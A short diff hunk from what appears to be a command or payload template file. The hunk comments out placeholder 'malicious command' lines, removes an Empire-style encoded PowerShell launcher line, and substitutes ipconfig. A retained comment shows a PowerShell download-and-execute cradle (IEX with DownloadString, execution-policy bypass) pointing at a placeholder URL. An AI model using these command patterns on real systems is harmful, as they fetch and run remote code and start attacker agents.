@@ -5,6 +5,6 @@
 # Powershell IEX example
 # powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('<URL>');"
 ################################################################################################################################################
-<malicious command 1>
-<malicious command 2>
-powershell -noP -sta -w 1 -enc  <empire base64 string>
+# <malicious command 1>
+# <malicious command 2>
+ipconfig
